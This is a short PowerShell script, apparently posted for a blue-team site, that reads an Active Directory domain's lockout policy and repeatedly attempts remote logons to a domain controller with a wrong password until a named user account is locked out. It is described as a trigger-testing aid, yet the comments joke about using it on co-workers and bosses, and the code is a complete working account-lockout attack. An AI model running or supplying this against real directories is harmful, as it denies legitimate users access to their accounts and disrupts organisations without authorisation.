#  Created by @ReallyBigAbe for BlueTeam.Ninja
#  I jacked the basics from http://mikefrobbins.com/2013/11/28/lock-out-active-directory-user-accounts-with-powershell/
#  I'm not a DEV, so I have no idea what the protocol is here

#  Basically just throw in an Account name, and this will dig up your lockout policy, smash the account until its locked, and carry on with life. 
#  Good for testing various triggers. 

#  Only use it on friends, suspicious co-workers, and your boss's boss.  Anything else isn't funny enough.




[CmdletBinding()]
Param(
    [Parameter(Mandatory=$true)]
        [string]$Account
)

#Set a garbage password
$Password = ConvertTo-SecureString 'Not Really My Password' -AsPlainText -Force

#Scrape the Lockout requirements
if ((([xml](Get-GPOReport -Name "Default Domain Policy" -ReportType Xml)).GPO.Computer.ExtensionData.Extension.Account |
Where-Object name -eq LockoutBadCount).SettingNumber) {


if(Test-Connection $env:LOGONSERVER) {$dc = $env:LOGONSERVER}
elseif(Test-Connection $env:USERDOMAIN) {$dc = $env:USERDOMAIN}
else {$dc = $null; Write-Output "No DCs to mess with"   return 1;}

Get-ADUser $Account -Properties SamAccountName, UserPrincipalName, LockedOut |
Do {

    Invoke-Command -ComputerName $dc {Get-Process
    } -Credential (New-Object System.Management.Automation.PSCredential ($($_.UserPrincipalName), $Password)) -ErrorAction SilentlyContinue

}
Until ((Get-ADUser -Identity $_.SamAccountName -Properties LockedOut).LockedOut)

Write-Output "$($_.SamAccountName) has been locked out"
}else{
    Write-Output "There's no lockout policy under `"Default Domain Policy`".  You might want to look into that, chief."
}

